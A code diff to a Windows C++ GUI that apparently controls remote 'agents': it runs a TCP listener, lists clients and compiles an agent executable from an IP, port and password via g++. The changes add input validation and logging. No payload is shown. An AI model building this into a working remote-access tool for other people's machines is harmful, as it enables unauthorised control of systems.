@@ -7,6 +7,7 @@
 #include <mutex>
 #include <windows.h>
 #include <winsock2.h>
+#include <regex>
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -30,6 +31,9 @@ void updateClientList();
 void handleError(const std::string& message);
 void buildAgent(const std::string& agentIp, int agentPort, const std::string& password);
 void startTCPServer(std::string ip, int port);
+bool validateIP(const std::string& ip);
+bool validatePort(int port);
+bool validatePassword(const std::string& password);
 
 // Function to show the disclaimer message box
 void showDisclaimer() {
@@ -93,47 +97,55 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
             agentPortInput = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER, 100, 130, 200, 25, hwnd, NULL, NULL, NULL);
 
             CreateWindow("STATIC", "Password:", WS_VISIBLE | WS_CHILD, 10, 160, 80, 25, hwnd, NULL, NULL, NULL);
-            passwordInput = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER, 100, 160, 200, 25, hwnd, NULL, NULL, NULL);
+            passwordInput = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_PASSWORD, 100, 160, 200, 25, hwnd, NULL, NULL, NULL);
 
             CreateWindow("BUTTON", "Build Agent", WS_VISIBLE | WS_CHILD, 10, 190, 140, 25, hwnd, (HMENU)3, NULL, NULL);
-            break;
+
+            CreateWindow("LISTBOX", "", WS_VISIBLE | WS_CHILD | WS_BORDER | LBS_NOTIFY, 10, 220, 400, 200, hwnd, (HMENU)4, NULL, NULL);
         }
+        break;
         case WM_COMMAND: {
             if (LOWORD(wParam) == 1) {
-                char serverIp[64];
-                GetWindowTextA(serverIpInput, serverIp, sizeof(serverIp));
-                char serverPort[64];
-                GetWindowTextA(serverPortInput, serverPort, sizeof(serverPort));
+                char ipBuffer[16], portBuffer[6];
+                GetWindowText(serverIpInput, ipBuffer, 16);
+                GetWindowText(serverPortInput, portBuffer, 6);
 
-                std::thread(startTCPServer, std::string(serverIp), atoi(serverPort)).detach();
+                std::string serverIp(ipBuffer);
+                int serverPort = std::stoi(portBuffer);
+
+                if (validateIP(serverIp) && validatePort(serverPort)) {
+                    std::thread tcpThread(startTCPServer, serverIp, serverPort);
+                    tcpThread.detach();
+                } else {
+                    MessageBox(hwnd, "Invalid server IP or port", "Error", MB_ICONERROR);
+                }
             } else if (LOWORD(wParam) == 2) {
                 if (tcpServerSocket != INVALID_SOCKET) {
                     closesocket(tcpServerSocket);
                     tcpServerSocket = INVALID_SOCKET;
+                    logMessage("TCP Server stopped\n", RGB(255, 0, 0));
                 }
             } else if (LOWORD(wParam) == 3) {
-                char agentIp[64];
-                GetWindowTextA(agentIpInput, agentIp, sizeof(agentIp));
-                char agentPort[64];
-                GetWindowTextA(agentPortInput, agentPort, sizeof(agentPort));
-                char password[64];
-                GetWindowTextA(passwordInput, password, sizeof(password));
+                char agentIpBuffer[16], agentPortBuffer[6], passwordBuffer[32];
+                GetWindowText(agentIpInput, agentIpBuffer, 16);
+                GetWindowText(agentPortInput, agentPortBuffer, 6);
+                GetWindowText(passwordInput, passwordBuffer, 32);
 
-                buildAgent(agentIp, atoi(agentPort), password);
+                std::string agentIp(agentIpBuffer);
+                int agentPort = std::stoi(agentPortBuffer);
+                std::string password(passwordBuffer);
+
+                if (validateIP(agentIp) && validatePort(agentPort) && validatePassword(password)) {
+                    buildAgent(agentIp, agentPort, password);
+                } else {
+                    MessageBox(hwnd, "Invalid agent IP, port or password", "Error", MB_ICONERROR);
+                }
             }
-            break;
         }
-        case WM_DESTROY: {
-            if (tcpServerSocket != INVALID_SOCKET) {
-                closesocket(tcpServerSocket);
-            }
-            if (udpServerSocket != INVALID_SOCKET) {
-                closesocket(udpServerSocket);
-            }
-            WSACleanup();
+        break;
+        case WM_DESTROY:
             PostQuitMessage(0);
             break;
-        }
         default:
             return DefWindowProc(hwnd, msg, wParam, lParam);
     }
@@ -141,49 +153,15 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
 }
 
 void logMessage(const std::string& message, COLORREF color) {
-    // Dummy implementation for logging messages with color
     std::cout << message << std::endl;
 }
 
 void updateClientList() {
-    // Dummy implementation for updating client list
+    // Stub function to update client list
 }
 
 void handleError(const std::string& message) {
-    logMessage("Error: " + message, RGB(255, 0, 0));
-    MessageBox(NULL, message.c_str(), "Error", MB_ICONERROR);
-}
-
-DWORD WINAPI TCPClientThread(LPVOID lpParam) {
-    SOCKET clientSocket = (SOCKET)lpParam;
-    char buffer[512];
-    int result;
-
-    while ((result = recv(clientSocket, buffer, sizeof(buffer), 0)) > 0) {
-        buffer[result] = '\0';
-        logMessage(buffer, RGB(0, 255, 0));
-    }
-
-    if (result == 0) {
-        logMessage("Client disconnected\n", RGB(255, 0, 0));
-    } else {
-        int error = WSAGetLastError();
-        handleError("Error receiving from client: " + std::to_string(error));
-    }
-
-    closesocket(clientSocket);
-
-    clientsMutex.lock();
-    clients.erase(inet_ntoa(((sockaddr_in*)lpParam)->sin_addr));
-    clientsMutex.unlock();
-
-    updateClientList();
-    return 0;
-}
-
-DWORD WINAPI UDPClientThread(LPVOID lpParam) {
-    // Dummy implementation for handling UDP clients
-    return 0;
+    std::cerr << message << std::endl;
 }
 
 void startTCPServer(std::string ip, int port) {
@@ -206,17 +184,17 @@ void startTCPServer(std::string ip, int port) {
     serverAddr.sin_port = htons(port);
 
     if (bind(tcpServerSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
-        handleError("Failed to bind TCP socket");
+        int error = WSAGetLastError();
+        handleError("Failed to bind TCP socket: " + std::to_string(error));
         closesocket(tcpServerSocket);
-        tcpServerSocket = INVALID_SOCKET;
         WSACleanup();
         return;
     }
 
     if (listen(tcpServerSocket, SOMAXCONN) == SOCKET_ERROR) {
-        handleError("Failed to listen on TCP socket");
+        int error = WSAGetLastError();
+        handleError("Failed to listen on TCP socket: " + std::to_string(error));
         closesocket(tcpServerSocket);
-        tcpServerSocket = INVALID_SOCKET;
         WSACleanup();
         return;
     }
@@ -273,4 +251,20 @@ void buildAgent(const std::string& agentIp, int agentPort, const std::string& pa
     system(("g++ -o " + std::string(AGENT_EXE) + " " + TEMP_AGENT_FILE).c_str());
 
     logMessage("Agent built successfully", RGB(0, 255, 0));
+}
+
+bool validateIP(const std::string& ip) {
+    std::regex ipRegex("^(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\\."
+                       "(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\\."
+                       "(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\\."
+                       "(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)$");
+    return std::regex_match(ip, ipRegex);
+}
+
+bool validatePort(int port) {
+    return port > 0 && port <= 65535;
+}
+
+bool validatePassword(const std::string& password) {
+    return !password.empty();
 }
